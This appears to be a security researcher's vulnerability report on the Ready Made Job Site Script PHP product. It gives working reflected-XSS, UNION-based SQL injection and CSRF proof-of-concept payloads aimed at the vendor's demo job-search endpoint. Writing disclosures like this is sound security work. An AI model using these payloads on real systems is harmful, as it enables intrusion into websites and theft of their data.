### Ready Made Job Site Script  SQLi/XSS/CSRF

Well, when I pentest the official demo site of Ready Made Job Site Script, I found some vulnerabilities here.

#### XSS:

There're some reflect-xss in this system, for example:

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/ready-made-job-site-script/xss1.png)

```
http://phpscriptsmall.biz/demo/onlinejobsearch/job
```

POST para:

keyword='"><svg/onload=alert(/xss/)><'"&location_name[]=

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/ready-made-job-site-script/xss2.png)


#### SQLi:

There're some reflect-xss in this system, for example:

```
http://phpscriptsmall.biz/demo/onlinejobsearch/job
```

POST para:

```
keyword=666&location_name[]=-1813) UNION ALL SELECT 6208,6208,6208,6208,6208,6208,6208,6208,6208,6208,6208,6208,CONCAT(0x716a707071,0x4b7052435851504b686a5571556e74777a5a43616a5742614b4e466b7a424a6f4b6b59484a566a51,0x716b6b6b71),6208,6208,6208,6208,6208,6208,6208,6208,6208,6208,6208,6208#
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/ready-made-job-site-script/sqli.png)


You can see,  we can obtain the current data user or more sensitive data now!

#### CSRF

With the csrf bug, we can cheat the user to change some important content ,or get post reflect-xss attack here.

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://phpscriptsmall.biz/demo/onlinejobsearch/job" method="POST">
      <input type="hidden" name="keyword" value="&apos;&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;&#47;xss&#47;&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="location&#95;name&#91;&#93;" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```




